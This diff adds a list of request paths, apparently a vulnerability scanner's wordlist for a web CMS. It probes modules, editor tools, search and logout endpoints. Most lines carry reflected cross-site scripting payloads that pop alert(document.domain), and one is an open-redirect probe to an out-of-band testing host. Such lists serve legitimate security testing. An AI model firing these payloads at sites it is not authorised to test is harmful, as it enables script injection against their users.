@@ -1,0 +1,8 @@
+/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x
+/api/logout?redirect_to=http://oast.pro/
+/demo/api/logout?redirect_to=/asdf%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/module/?module=%27onm%3Ca%3Eouseover=alert(document.domain)%27%22tabindex=1&style=width:100%25;height:100%25;&id=x&data-show-ui=admin&class=x&from_url={{BaseURL}}
+/editor_tools/module?type=%22%3E%3Cdiv%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/api/module?type=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&live_edit=true&from_url=test
+/search.php?keywords=ABC%3Cdiv%20style=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/editor_tools/rte_image_editor?types=%27;});alert(document.domain);$(picker).on(%27Noodles%27,%20function(result)%20{%20var%20XSS=%27
